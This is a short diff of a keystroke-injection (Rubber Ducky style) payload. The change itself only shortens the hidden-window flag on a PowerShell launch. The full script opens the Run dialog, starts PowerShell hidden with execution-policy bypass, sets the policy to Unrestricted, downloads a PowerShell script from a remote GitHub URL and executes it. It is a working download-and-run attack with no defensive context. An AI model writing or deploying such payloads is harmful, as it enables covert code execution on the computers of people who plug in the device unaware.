@@ -1,7 +1,7 @@
 DELAY 300
 GUI r
 DELAY 200
-STRING powershell -WindowStyle Hidden -NoP -NonI -Exec Bypass
+STRING powershell -w h -NoP -NonI -Exec Bypass
 ENTER
 DELAY 200
 STRING Set-ExecutionPolicy -Scope CurrentUser Unrestricted -Force; (New-Object System.Net.WebClient).DownloadFile("https://raw.githubusercontent.com/byshop04/Rubberducky/main/ducky.ps1", [System.IO.Path]::Combine((Get-Location).Path, 'script.ps1')); & ([System.IO.Path]::Combine((Get-Location).Path, 'script.ps1'))
